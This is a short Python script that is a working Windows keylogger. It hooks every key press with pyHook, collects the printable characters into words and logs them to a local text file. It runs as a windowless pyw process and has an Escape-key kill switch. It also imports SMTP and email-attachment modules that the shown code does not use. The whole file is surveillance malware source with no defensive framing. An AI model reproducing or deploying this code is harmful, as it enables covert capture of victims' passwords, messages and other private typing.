import pyHook, pythoncom, sys, logging
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

log_location = 'C:\\Logger\output.txt'
current_word = ""


def onKeyboardEvent(event):
    global current_word
    logging.basicConfig(filename=log_location, level=logging.DEBUG, format='%(message)s')

    ## kills script so I dont have to end it in task manager
    if event.Ascii == 27:
        os.system("taskkill /f /im  pyw.exe")
    current_char = chr(event.Ascii)
    if ord(current_char) > 32 and ord(current_char) < 128 :
        current_word += current_char
        return True
    logging.log(10, current_word)
    current_word = ""
    return True


hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = onKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
